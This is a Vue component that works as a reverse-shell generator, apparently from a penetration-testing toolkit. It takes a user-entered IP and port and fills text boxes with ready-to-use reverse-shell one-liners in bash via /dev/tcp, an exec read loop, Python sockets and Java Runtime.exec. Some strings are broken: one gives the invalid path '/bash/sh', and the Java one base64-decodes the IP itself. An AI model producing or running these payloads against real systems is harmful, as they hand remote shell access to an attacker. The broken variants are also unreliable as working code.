<template>
    <el-form label-position="top">
        <el-form-item label="Target">
            <el-row :gutter="20">
                <el-col :span="12">
                    <el-input placeholder="IP" v-model="reverse.ip" @input="updateTexts" />
                </el-col>
                <el-col :span="12">
                    <el-input placeholder="Port" v-model="reverse.port" @input="updateTexts" />
                </el-col>
            </el-row>
        </el-form-item>
        <el-form-item label="Bash1">
            <textarea class="textarea" v-model="reverse.bash1" readonly></textarea>
        </el-form-item>
        <el-form-item label="Bash2">
            <textarea class="textarea" v-model="reverse.bash2" readonly></textarea>
        </el-form-item>
        <el-form-item label="Exec">
            <textarea class="textarea" v-model="reverse.exec" readonly></textarea>
        </el-form-item>
        <el-form-item label="Python">
            <textarea class="textarea" v-model="reverse.python" readonly></textarea>
        </el-form-item>
        <el-form-item label="Java">
            <textarea class="textarea" v-model="reverse.java" readonly></textarea>
        </el-form-item>
    </el-form>
</template>
  
<script lang="ts" setup>
import { reactive } from 'vue';

const reverse = reactive({
    ip: '',
    port: '',
    bash1: '',
    bash2: '',
    exec: '',
    python: '',
    java: ''
})

function updateTexts() {
    if (reverse.ip || reverse.port) {
        reverse.bash1 = `bash -i >& /dev/tcp/${reverse.ip}/${reverse.port} 0>&1`;
        reverse.bash2 = `/bash/sh -i >& /dev/tcp/${reverse.ip}/${reverse.port} 0>&1`;
        reverse.exec = `exec 5<>/dev/tcp/${reverse.ip}/${reverse.port};cat <&5|while read line;do $line >&5 2>&1;done`;
        reverse.python = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${reverse.ip}",${reverse.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`;
        reverse.java = `eval java.lang.Runtime.getRuntime().exec("bash -c {echo,${reverse.ip}|{base64,-d}|{bash,-i}}")`;
    } else {
        reverse.bash1 = '';
        reverse.bash2 = '';
        reverse.exec = '';
        reverse.python = '';
        reverse.java = '';
    }
}

</script>
  
<style>
.textarea {
    width: 100%;
    display: flex;
    height: 60px;
    font-size: large;
}
</style>